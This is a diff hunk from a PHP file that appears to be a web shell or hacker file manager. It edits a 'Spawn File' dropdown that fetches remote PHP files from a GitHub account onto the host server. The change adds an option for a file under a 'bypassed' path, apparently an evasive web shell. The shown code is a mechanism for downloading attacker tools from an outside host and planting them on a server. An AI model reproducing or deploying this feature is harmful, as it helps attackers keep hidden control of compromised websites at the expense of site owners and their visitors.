@@ -281,8 +281,8 @@ function genBreadcrumb($path) {
         <form method="post">
             <select name="file-url" class="dropdown">
                 <option value="https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/litespeed.php">LiteSpeed</option>
-                <option value="https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/tiny.php">Tiny FM</option>
-                <option value="https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/litespeed.php">Maw</option>
+                <option value="https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/tiny.php">TinyFM</option>
+                <option value="https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/small-anon.php">Anon</option>
             </select>
             <button type="submit" class="spawn-button">Spawn File</button>
         </form>
